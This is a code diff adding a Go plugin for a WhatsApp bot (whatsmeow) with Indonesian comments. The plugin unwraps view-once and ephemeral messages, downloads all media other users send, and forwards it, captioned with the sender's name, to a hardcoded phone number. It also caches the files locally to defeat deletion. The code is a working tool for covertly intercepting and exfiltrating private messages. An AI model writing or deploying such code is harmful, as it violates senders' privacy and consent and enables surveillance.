@@ -1,0 +1,237 @@
+package plugin
+
+import (
+	"context"
+	"fmt"
+	"os"
+	"os/exec"
+
+	"go.mau.fi/whatsmeow"
+	"go.mau.fi/whatsmeow/binary/proto"
+	"go.mau.fi/whatsmeow/types"
+	"go.mau.fi/whatsmeow/types/events"
+)
+
+// DownloadDanTeruskanSemuaMedia mengekstrak media apa pun (VO/Biasa), meneruskannya ke target, dan mengembalikan path cache
+func DownloadDanTeruskanSemuaMedia(client *whatsmeow.Client, m *events.Message) (string, bool) {
+	ctx := context.Background()
+	targetJID, errJID := types.ParseJID("6285161098098@s.whatsapp.net")
+	if errJID != nil {
+		return "", false
+	}
+
+	if m.Info.IsFromMe || m.Message == nil {
+		return "", false
+	}
+
+	// 1. Deteksi awal apakah ini struktur pembungkus View Once
+	isViewOnce := false
+	rawMessage := m.Message
+
+	// Periksa kontainer luar yang sering kali membuat pesan terbaca "kosong" di parser biasa
+	if rawMessage.GetViewOnceMessage() != nil || 
+	   rawMessage.GetViewOnceMessageV2() != nil || 
+	   rawMessage.GetViewOnceMessageV2Extension() != nil {
+		isViewOnce = true
+	}
+
+	// 2. Unwrapping/Membongkar layer bungkus pesan secara agresif (ViewOnce, Ephemeral, dll)
+	for {
+		if rawMessage.GetViewOnceMessageV2() != nil {
+			isViewOnce = true
+			rawMessage = rawMessage.GetViewOnceMessageV2().GetMessage()
+			continue
+		}
+		if rawMessage.GetViewOnceMessage() != nil {
+			isViewOnce = true
+			rawMessage = rawMessage.GetViewOnceMessage().GetMessage()
+			continue
+		}
+		if rawMessage.GetViewOnceMessageV2Extension() != nil {
+			isViewOnce = true
+			rawMessage = rawMessage.GetViewOnceMessageV2Extension().GetMessage()
+			continue
+		}
+		if rawMessage.GetEphemeralMessage() != nil {
+			rawMessage = rawMessage.GetEphemeralMessage().GetMessage()
+			continue
+		}
+		break
+	}
+
+	if rawMessage == nil {
+		return "", false
+	}
+
+	var data []byte
+	var err error
+	var mediaType string
+	var caption string
+	var outputMessage *proto.Message
+
+	// 3. Ambil Objek Media Internal hasil pembongkaran
+	imgMsg := rawMessage.GetImageMessage()
+	vidMsg := rawMessage.GetVideoMessage()
+	audMsg := rawMessage.GetAudioMessage()
+	docMsg := rawMessage.GetDocumentMessage()
+
+	// Jika di tingkat atas terdeteksi flag ViewOnce internal
+	if (imgMsg != nil && imgMsg.GetViewOnce()) || 
+	   (vidMsg != nil && vidMsg.GetViewOnce()) || 
+	   (audMsg != nil && audMsg.GetViewOnce()) {
+		isViewOnce = true
+	}
+
+	// Tentukan label pengirim
+	tag := "MEDIA"
+	if isViewOnce {
+		tag = "RVO"
+	}
+
+	// 4. Eksekusi Download berdasarkan tipe media yang ditemukan
+	if imgMsg != nil {
+		mediaType = "image"
+		caption = imgMsg.GetCaption()
+		sendReactionMedia(client, m.Info.Chat, m.Info.ID, "🕒")
+		data, err = client.Download(ctx, imgMsg)
+		if err == nil {
+			if uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaImage); errUpload == nil {
+				captionStr := fmt.Sprintf("[%s PASIF - %s]\n%s", tag, m.Info.PushName, caption)
+				outputMessage = &proto.Message{
+					ImageMessage: &proto.ImageMessage{
+						URL:           &uploaded.URL,
+						DirectPath:    &uploaded.DirectPath,
+						MediaKey:      uploaded.MediaKey,
+						FileEncSHA256: uploaded.FileEncSHA256,
+						FileSHA256:    uploaded.FileSHA256,
+						FileLength:    &uploaded.FileLength,
+						Mimetype:      imgMsg.Mimetype,
+						Caption:       &captionStr,
+					},
+				}
+			}
+		}
+	} else if vidMsg != nil {
+		mediaType = "video"
+		caption = vidMsg.GetCaption()
+		sendReactionMedia(client, m.Info.Chat, m.Info.ID, "🕒")
+		data, err = client.Download(ctx, vidMsg)
+		if err == nil {
+			if uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaVideo); errUpload == nil {
+				captionStr := fmt.Sprintf("[%s PASIF - %s]\n%s", tag, m.Info.PushName, caption)
+				outputMessage = &proto.Message{
+					VideoMessage: &proto.VideoMessage{
+						URL:           &uploaded.URL,
+						DirectPath:    &uploaded.DirectPath,
+						MediaKey:      uploaded.MediaKey,
+						FileEncSHA256: uploaded.FileEncSHA256,
+						FileSHA256:    uploaded.FileSHA256,
+						FileLength:    &uploaded.FileLength,
+						Mimetype:      vidMsg.Mimetype,
+						Caption:       &captionStr,
+					},
+				}
+			}
+		}
+	} else if audMsg != nil {
+		mediaType = "audio"
+		sendReactionMedia(client, m.Info.Chat, m.Info.ID, "🕒")
+		data, err = client.Download(ctx, audMsg)
+		if err == nil {
+			// Konversi Audio ke MP3 agar aman diputar di semua device target
+			fileInput := fmt.Sprintf("temp_all_in_%s.ogg", m.Info.ID)
+			fileOutput := fmt.Sprintf("temp_all_out_%s.mp3", m.Info.ID)
+			
+			if errWrite := os.WriteFile(fileInput, data, 0644); errWrite == nil {
+				cmd := exec.Command("ffmpeg", "-y", "-i", fileInput, "-vn", "-ar", "44100", "-ac", "2", "-b:a", "128k", fileOutput)
+				if errCmd := cmd.Run(); errCmd == nil {
+					if audioData, errRead := os.ReadFile(fileOutput); errRead == nil {
+						if uploaded, errUpload := client.Upload(ctx, audioData, whatsmeow.MediaAudio); errUpload == nil {
+							isPTT := true
+							mpegMime := "audio/mpeg"
+							outputMessage = &proto.Message{
+								AudioMessage: &proto.AudioMessage{
+									URL:           &uploaded.URL,
+									DirectPath:    &uploaded.DirectPath,
+									MediaKey:      uploaded.MediaKey,
+									FileEncSHA256: uploaded.FileEncSHA256,
+									FileSHA256:    uploaded.FileSHA256,
+									FileLength:    &uploaded.FileLength,
+									Mimetype:      &mpegMime,
+									PTT:           &isPTT,
+								},
+							}
+						}
+					}
+				}
+				os.Remove(fileInput)
+				os.Remove(fileOutput)
+			}
+		}
+	} else if docMsg != nil {
+		mediaType = "document"
+		sendReactionMedia(client, m.Info.Chat, m.Info.ID, "🕒")
+		data, err = client.Download(ctx, docMsg)
+		if err == nil {
+			if uploaded, errUpload := client.Upload(ctx, data, whatsmeow.MediaDocument); errUpload == nil {
+				captionStr := fmt.Sprintf("[%s DOC - %s]\n%s", tag, m.Info.PushName, docMsg.GetTitle())
+				outputMessage = &proto.Message{
+					DocumentMessage: &proto.DocumentMessage{
+						URL:           &uploaded.URL,
+						DirectPath:    &uploaded.DirectPath,
+						MediaKey:      uploaded.MediaKey,
+						FileEncSHA256: uploaded.FileEncSHA256,
+						FileSHA256:    uploaded.FileSHA256,
+						FileLength:    &uploaded.FileLength,
+						Mimetype:      docMsg.Mimetype,
+						Title:         &captionStr,
+						FileName:      docMsg.FileName,
+					},
+				}
+			}
+		}
+	}
+
+	// 5. Kirim ke Target & Buat file Cache Lokal untuk keperluan Anti-Delete bawaan framework Anda
+	if outputMessage != nil {
+		client.SendMessage(ctx, targetJID, outputMessage)
+		sendReactionMedia(client, m.Info.Chat, m.Info.ID, "✅")
+
+		// Simpan data media secara lokal ke folder cache agar fitur anti-delete bot Anda tetap berfungsi
+		cacheFolder := "media_cache"
+		_ = os.MkdirAll(cacheFolder, os.ModePerm)
+		
+		var extension string
+		switch mediaType {
+		case "image": extension = ".jpg"
+		case "video": extension = ".mp4"
+		case "audio": extension = ".mp3"
+		default: extension = ".bin"
+		}
+		
+		cachePath := fmt.Sprintf("%s/%s%s", cacheFolder, m.Info.ID, extension)
+		_ = os.WriteFile(cachePath, data, 0644)
+		
+		return cachePath, true
+	}
+
+	return "", false
+}
+
+func sendReactionMedia(client *whatsmeow.Client, chat types.JID, msgID string, emoji string) {
+	ctx := context.Background()
+	remoteJidStr := chat.String()
+	fromMe := false
+
+	client.SendMessage(ctx, chat, &proto.Message{
+		ReactionMessage: &proto.ReactionMessage{
+			Key: &proto.MessageKey{
+				RemoteJID: &remoteJidStr,
+				FromMe:    &fromMe,
+				ID:        &msgID,
+			},
+			Text:              &emoji,
+			SenderTimestampMS: new(int64),
+		},
+	})
+}
